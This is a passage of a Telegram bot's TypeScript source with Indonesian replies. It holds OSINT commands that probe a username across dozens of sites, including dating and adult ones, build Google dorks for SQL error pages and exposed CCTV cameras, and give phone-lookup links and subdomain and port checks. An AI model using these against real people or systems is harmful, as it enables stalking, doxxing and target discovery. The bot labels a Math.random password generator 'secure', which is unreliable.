        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "HackTheBox", url: `https://forum.hackthebox.eu/profile/${username}` },
        { name: "TryHackMe", url: `https://tryhackme.com/p/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        // Indo & Forums
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
      }
      
      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <i>Digital footprint scan complete.</i>`;

      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          const vendor = await res.text();
          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query data berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url]");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
                      `📋 <b>HEADERS DATA:</b>\n` +
                      `<pre>${hdrs.substring(0,3800)}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Dorking links generated.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
                        `├ 🔝 TIER: ${data.CardTier}\n` +
                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
                        `└ 🏦 BANK: ${data.Issuer}\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query BIN berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      const domain = args[1];
      try {
        ctx.reply(`🔍 Sedang crawling mapping subdomain untuk <b>${domain}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${domain}&output=json`, {}, 8000);
        const data = await res.json();
        const subs = [...new Set(data.map((d:any) => d.name_value))].slice(0, 30);
        if(subs.length > 0) {
          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
                        `📋 <b>FOUND SUBS (MAX 30):</b>\n` +
                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Reconnaissance selesai.</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. (crt.sh timeout)"); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const d = await res.json();
        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
                      `├ <b>Name:</b> ${d.name || '-'}\n` +
                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
                      `├ <b>Location:</b> ${d.location || '-'}\n` +
                      `├ <b>Company:</b> ${d.company || '-'}\n` +
                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
                      `├ <b>Followers:</b> ${d.followers}\n` +
                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Metadata extraction complete.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 3) return ctx.reply("Format: /port [ip] [port]");
      const ip = args[1]; const port = parseInt(args[2]);
      const socket = new net.Socket();
      socket.setTimeout(2500);
      let status = "❌ CLOSED / UNREACHABLE";
      socket.on('connect', () => { status = "✅ OPENED"; socket.destroy(); });
      socket.on('timeout', () => { socket.destroy(); });
      socket.on('error', () => { socket.destroy(); });
      socket.on('close', () => {
        const reply = `<b>🔌 TCP PORT CONNECTIVITY</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${ip}</code>\n` +
                      `├ <b>PORT:</b> <code>${port}</code>\n` +
                      `└ <b>STATUS:</b> <b>${status}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      });
      socket.connect(port, ip);
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp]");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      const reply = `<b>📱 PHONE TRACKING DORKS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Truecaller:</b> <a href="https://www.truecaller.com/search/global/${numID}">Cari Identitas</a>\n` +
                    `├ 💬 <b>WhatsApp:</b> <a href="https://wa.me/${numID}">Check Profile</a>\n` +
                    `└ 🔍 <b>Google:</b> <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Jejak Digital</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Tips: Gunakan aplikasi GetContact (Apps) untuk hasil nama tag terbaik.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📏 <b>Length:</b> ${len} chars\n` +
                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      const result = Buffer.from(args).toString('base64');
      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${result}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { 
        const result = Buffer.from(args, 'base64').toString('utf8');
        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<code>${result}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'}); 
      } catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('hash', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /hash [text]");
      const md5 = crypto.createHash('md5').update(args).digest('hex');
      const sha256 = crypto.createHash('sha256').update(args).digest('hex');
      const reply = `<b>🔐 MULTI-HASH GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TEXT:</b> <code>${args}</code>\n\n` +
                    `├ <b>MD5:</b>\n└ <code>${md5}</code>\n\n` +
                    `├ <b>SHA256:</b>\n└ <code>${sha256}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      const reply = `<b>🆔 UUID GEN (v4)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${crypto.randomUUID()}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        const text = await res.text();
        const reply = `<b>⛅ WEATHER FORECAST</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `<pre>${text}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            const reply = `<b>🪙 MARKET PRICE: ${args.toUpperCase()}</b>\n` +
                          `━━━━━━━━━━━━━━━━━━━━\n` +
                          `├ 💵 <b>USD:</b> $${data[args.toLowerCase()].usd}\n` +
                          `└ 🇮🇩 <b>IDR:</b> Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
            ctx.reply(reply, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    const downloadSong = async (ctx: any) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("🎵 Gunakan format: /lagu [judul] atau /play [judul]");
      
      const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database (YouTube)...</i>", { parse_mode: 'HTML' });
      try {
        const results = await yts(args);
        
        if (!results || results.videos.length === 0) {
           return ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, "❌ ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.");
        }
        
        const video = results.videos[0];
        
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `⏳ <i>ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ: ${video.title}...\n(ᴘʀᴏꜱᴇꜱ ʙʏᴘᴀꜱꜱ ᴋᴇᴄᴇᴘᴀᴛᴀɴ ᴛɪɴɢɢɪ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ...)</i>`, { parse_mode: 'HTML' });
        
        try {
          const stream = await play.stream(video.url);
          
          await ctx.replyWithAudio(
            { source: stream.stream, filename: video.title + '.mp3' },
            { caption: `🎵 <b>${video.title}</b>\n👤 <b>Author:</b> ${video.author.name}\n☁️ <b>Source:</b> YouTube`, parse_mode: 'HTML' }
          );
          
          ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});
        } catch (downloadErr: any) {
          throw new Error("Gagal mengambil stream audio via play-dl: " + downloadErr?.message);
        }
      } catch (err: any) {
        console.error("Lagu err:", err);
        ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, `❌ Gagal mengunduh lagu: ${err?.message || 'Error internal'}`);
      }
    };

    bot.command('lagu', downloadSong);
    bot.command('play', downloadSong);

    // --- 20+ MINI GAMES ---
    bot.command('suit', (ctx) => {
      const choices = ['batu', 'gunting', 'kertas'];
      const args = ctx.message.text.split(' ')[1]?.toLowerCase();
      if (!args || !choices.includes(args)) return ctx.reply("Format: /suit [batu/gunting/kertas]");
      const botChoice = choices[Math.floor(Math.random() * choices.length)];
      let result = 'KITA SERI! 😑';
      if (
        (args === 'batu' && botChoice === 'gunting') ||
        (args === 'gunting' && botChoice === 'kertas') ||
        (args === 'kertas' && botChoice === 'batu')
      ) { result = 'KAMU MENANG! 🎉'; }
      else if (args !== botChoice) { result = 'KAMU KALAH! 🤡'; }
      ctx.reply(`Kamu: ${args.toUpperCase()}\nBot: ${botChoice.toUpperCase()}\n\n${result}`);
    });

    bot.command('math', (ctx) => {
      const ops = ['+', '-', '*'];
      const op = ops[Math.floor(Math.random() * ops.length)];
      const a = Math.floor(Math.random() * 50) + 1;
      const b = Math.floor(Math.random() * 20) + 1;
      const ans = op === '+' ? a+b : op === '-' ? a-b : a*b;
      ctx.reply(`🧮 <b>QUICK MATHS</b>\nBerapa hasil dari: <b>${a} ${op} ${b} = ?</b>\n\n<tg-spoiler>Jawaban: ${ans}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('dadu', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Kamu melempar dadu dan mendapat angka: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('coinflip', (ctx) => {
      const res = Math.random() > 0.5 ? 'HEADS (Angka)' : 'TAILS (Gambar)';
      ctx.reply(`🪙 Koin dilempar dan hasilnya: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('susunkata', (ctx) => {
      const words = ['hacker', 'phishing', 'malware', 'firewall', 'server', 'database', 'payload', 'system', 'network', 'cyber'];
      const word = words[Math.floor(Math.random() * words.length)];
      const scrambled = word.split('').sort(() => 0.5 - Math.random()).join('');
      ctx.reply(`🔡 <b>SUSUN KATA</b>\nCoba susun huruf ini menjadi istilah IT:\n<b>${scrambled.toUpperCase()}</b>\n\n<tg-spoiler>Jawaban: ${word.toUpperCase()}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakangka', (ctx) => {
      const a = Math.floor(Math.random() * 10) + 1;
      ctx.reply(`🔢 <b>TEBAK ANGKA</b>\nAku sudah memilih angka dari 1 - 10.\n\n<tg-spoiler>Angka itu adalah: ${a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('khodam', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const k = ['Macan Putih', 'Naga Sakti', 'Kuntilanak Merah', 'Kucing Oren', 'Tuyul Racing', 'Siluman Ular', 'Bebek Ngesot', 'Kosong (Tidak Ada)', 'Kulkas 2 Pintu', 'Spion Motor'];
      const res = k[Math.floor(Math.random() * k.length)];
      ctx.reply(`👻 <b>CEK KHODAM</b>\nNama: ${nama}\nKhodam kamu: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('ramal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Kamu';
      const r = ['Akan kaya raya tahun depan!', 'Akan menemukan jodoh secepatnya!', 'Akan kesandung batu besok', 'Harus lebih banyak minum air putih', 'Sedang dirindukan seseorang', 'Akan mendapat rezeki nomplok', 'Akan menangis bahagia hari ini'];
      const res = r[Math.floor(Math.random() * r.length)];
      ctx.reply(`🔮 <b>RAMALAN HARI INI</b>\nNama: ${nama}\nRamalan: <i>${res}</i>`, {parse_mode: 'HTML'});
    });

    bot.command('jodoh', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 3) return ctx.reply("Format: /jodoh [Nama1] [Nama2]");
      const pct = Math.floor(Math.random() * 101);
      ctx.reply(`💘 <b>KALKULATOR JODOH</b>\n${args[1]} 💞 ${args[2]}\n\nTingkat Kecocokan: <b>${pct}%</b>\n${pct > 80 ? 'Wow! Kalian sangat serasi!' : pct > 40 ? 'Hmm, boleh juga.' : 'Sebaiknya cari yang lain...'}`, {parse_mode: 'HTML'});
    });

    bot.command('kartu', (ctx) => {
      const suits = ['♠️ Terop', '♥️ Hati', '♣️ Keriting', '♦️ Wajik'];
      const values = ['As', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'Jack', 'Queen', 'King'];
      const a = suits[Math.floor(Math.random() * suits.length)];
      const b = values[Math.floor(Math.random() * values.length)];
      ctx.reply(`🃏 Kamu menarik kartu: <b>${b} ${a}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roulette', (ctx) => {
      const bullet = Math.floor(Math.random() * 6);
      if (bullet === 0) return ctx.reply("🔫 💥 DORRR!!! Kamu tertembak (Russian Roulette)!");
      ctx.reply("🔫 <i>Click...</i> Selamat, peluru kosong. Kamu selamat.", {parse_mode: 'HTML'});
    });

    bot.command('werewolf', (ctx) => {
      const roles = ['🐺 Werewolf', '🧙‍♀️ Seer', '🛡️ Bodyguard', '🧑‍🌾 Villager', '🃏 Fool'];
      const r = roles[Math.floor(Math.random() * roles.length)];
      ctx.reply(`🌕 <b>WEREWOLF ROLE</b>\nRole kamu adalah: <b>${r}</b>!`, {parse_mode: 'HTML'});
    });

    bot.command('8ball', (ctx) => {
      const q = ctx.message.text.split(' ').slice(1).join(' ');
      if(!q) return ctx.reply("Format: /8ball [pertanyaan]");
      const a = ['Ya, pasti.', 'Bisa jadi.', 'Tentu saja tidak.', 'Sangat meragukan.', 'Tanya lagi nanti.', 'My sources say no.', 'Tentu.'];
      const res = a[Math.floor(Math.random() * a.length)];
      ctx.reply(`🎱 <b>MAGIC 8-BALL</b>\nPertanyaan: <i>${q}</i>\nJawaban: <b>${res}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('tarot', (ctx) => {
      const cards = ['The Fool (Awal baru)', 'The Magician (Kekuatan)', 'The High Priestess (Intuisi)', 'Death (Perubahan)', 'The Tower (Kehancuran)', 'The Sun (Kebahagiaan)', 'The Star (Harapan)'];
      const c = cards[Math.floor(Math.random() * cards.length)];
